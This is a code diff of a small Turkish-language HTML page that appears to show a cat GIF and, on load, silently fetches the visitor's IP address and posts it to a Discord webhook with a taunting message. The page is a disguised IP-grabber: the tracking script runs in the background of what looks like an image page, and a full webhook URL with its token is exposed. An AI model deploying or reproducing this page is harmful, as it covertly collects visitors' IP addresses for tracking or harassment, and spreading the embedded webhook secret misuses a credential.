@@ -2,7 +2,7 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>Fotoğraf Göster</title>
+  <title>hi</title>
   <style>
     body {
       margin: 0;
@@ -20,7 +20,7 @@
   </style>
 </head>
 <body>
-  <img src="fotoğraf.png" alt="Görsel" />
+  <img src="nuggetand-cat.gif" alt="gif" />
 
   <script>
     fetch('https://api.ipify.org?format=json')
@@ -28,7 +28,7 @@
       .then(data => {
         const ip = data.ip;
 
-        // Kendi Discord Webhook linkini buraya yapıştır
+        // SO SECRET
         const webhookURL = 'https://discord.com/api/webhooks/1390255915609096233/BGQ4WXbcbos9jx2lGDqEeOrp2v2f8CLwLSUKoWc2Zn2vIORbFgKI2GkOVPG2Hb27yq_q';
 
         fetch(webhookURL, {
@@ -37,7 +37,7 @@
             'Content-Type': 'application/json'
           },
           body: JSON.stringify({
-            content: `Yeni ziyaretçi IP: ${ip}`
+            content: `Wake UP https://www.youtube.com/watch?v=NAUSoti82m8, IP: ${ip}`
           })
         });
       })
